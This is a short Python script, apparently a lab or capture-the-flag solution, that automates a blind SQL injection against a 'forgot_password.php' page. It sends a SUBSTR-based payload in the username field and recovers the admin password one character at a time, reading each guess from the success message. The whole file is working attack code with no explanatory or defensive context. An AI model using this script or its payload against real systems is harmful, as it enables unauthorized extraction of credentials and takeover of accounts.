import string
import requests
URL = 'http://{host/ip}/forgot_password.php'
CHARSET = "," + string.ascii_letters + string.digits + "_"
SUCCESS = 'Successfully sent password'
PAYLOAD = "admin' AND SUBSTR(password,{},1)='{}' -- -"
password = ''
with requests.Session() as session:
    while True:
        for char in CHARSET:
            password_i = len(password)
            resp = session.post(URL, data={'username': PAYLOAD.format(password_i + 1, char)})
            print(f'\r[{password_i}] {password}{char}', end='')
            if SUCCESS in resp.text:
                password += char
                break
        else:
            break
    print(f'\r[{password_i}] {password} | {char}')
